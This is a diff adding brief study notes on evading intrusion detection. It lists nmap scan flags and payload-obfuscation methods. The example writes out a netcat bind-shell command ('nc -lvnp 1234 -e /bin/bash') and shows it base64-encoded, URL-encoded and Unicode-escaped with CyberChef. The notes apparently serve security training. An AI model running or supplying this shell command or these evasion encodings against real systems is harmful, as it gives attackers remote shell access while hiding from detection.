@@ -45,3 +45,39 @@
 #### --badsum
 
 #### --scanflags: URG ACK PSH RST SYN FIN (Custom TCP flag combinations)
+
+# EVASION VIA PAYLOAD MANIPULATION
+
+### 1) Obfuscating and encoding the payload
+
+### 2) Encrypting the communication channel
+
+### 3) Modifying the shellcode
+
+# 1st Technique example
+
+### 1) Encode to Base64 format
+
+#### 1: cat input.txt
+
+#### 2: nc -lvnp 1234 -e /bin/bash
+
+#### 3: base64 input.txt
+
+### 2) URL Encoding
+
+#### urlencode nc -lvnp 1234 -e /bin/bash
+
+### 3) Escaped Unicode
+
+### Tool: Cyberchef
+
+#### 1) Search "Escape Unicode Characters"
+
+#### 2) Drag to recipe
+
+#### 3) Checkmark "encode all chars with a prefix of \u"
+
+#### 4) Checkmark "Uppercase hex with a padding of 4"
+
+
